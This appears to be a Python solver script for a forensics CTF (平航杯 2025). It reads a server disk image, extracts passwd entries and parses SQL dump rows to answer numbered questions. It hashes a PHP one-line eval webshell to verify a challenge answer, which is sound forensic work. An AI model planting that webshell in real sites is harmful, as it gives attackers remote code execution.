# -*- coding: utf-8 -*-
# 提取完整 dump.sql + 真实 passwd + 验证 webshell，解 题3/9/10/12/14
import sys, struct, re, datetime, hashlib
sys.path.insert(0, r"D:\MemLens")
from memlens.formats.xfs import open_server_fs

IMG = r"E:\2025平航杯\平航杯题目"
PW = "早起王的爱恋日记\u2764"
x, meta = open_server_fs(IMG, PW)

# ---- 题12 webshell sha256 ----
ws = b"<?php @eval($_POST['peiqi'])?>"
print("题12 sha256:", hashlib.sha256(ws).hexdigest().upper(), "== 870BF66B...", flush=True)

# ---- 题3 passwd ----
print("\n[题3] 真实 passwd @ blk 3244079", flush=True)
d = x.read(13287748668 - 1200, 4096)
txt = d.decode("utf-8", "replace")
i = txt.find("root:x:0:0")
if i >= 0:
    seg = txt[i:i+600]
    for line in seg.splitlines():
        if ":" in line and "x:" in line:
            print("  ", line, flush=True)

# ---- 题9/10/14 dump.sql @ blk 228231 ----
print("\n[题9/10/14] dump.sql @ blk 228231", flush=True)
d = x.read(934836886, 6 << 20)  # 6MB
# 找到 dump.sql 起止（可能有多份/拼接）
i0 = d.find(b"-- Records of `tp_order`")
if i0 < 0: i0 = 0
text = d.decode("utf-8", "replace")

def extract_inserts(txt, table):
    rows = []
    for m in re.finditer(r"INSERT INTO\s+`?" + re.escape(table) + r"`?\s+VALUES\s*(.*?);", txt, re.S):
        body = m.group(1)
        vals = re.findall(r"'(?:\\'|[^'])*'|(?:-?\d+(?:\.\d+)?)", body)
        vals = [v[1:-1] if v.startswith("'") else v for v in vals]
        rows.append(vals)
    return rows

# 题9: tp_order count in [2016-04-01, 2025-04-01)
start_ts = int(datetime.datetime(2016,4,1).timestamp())
end_ts = int(datetime.datetime(2025,4,1).timestamp())
rows = extract_inserts(text, "tp_order")
cnt = 0; times=[]
for r in rows:
    if len(r) > 29:
        try: at = int(r[29])
        except: continue
        if start_ts <= at < end_ts:
            cnt += 1; times.append(at)
print(f"题9: tp_order 行数={len(rows)} 区间内={cnt} 最早={datetime.datetime.fromtimestamp(min(times)) if times else '-'} 最晚={datetime.datetime.fromtimestamp(max(times)) if times else '-'}", flush=True)

# 题10: tp_config freight_free
cfg_rows = extract_inserts(text, "tp_config")
print(f"题10: tp_config 行数={len(cfg_rows)}", flush=True)
for r in cfg_rows:
    for v in r:
        if "freight_free" in v:
            # 找到对应值（可能相邻）
            print("  freight_free 行:", r[:10], flush=True)

# 题14: 用户注册到首单间隔最短
user_rows = extract_inserts(text, "tp_user")
user_rows2 = extract_inserts(text, "tp_users")
print(f"题14: tp_user 行数={len(user_rows)} tp_users 行数={len(user_rows2)}", flush=True)
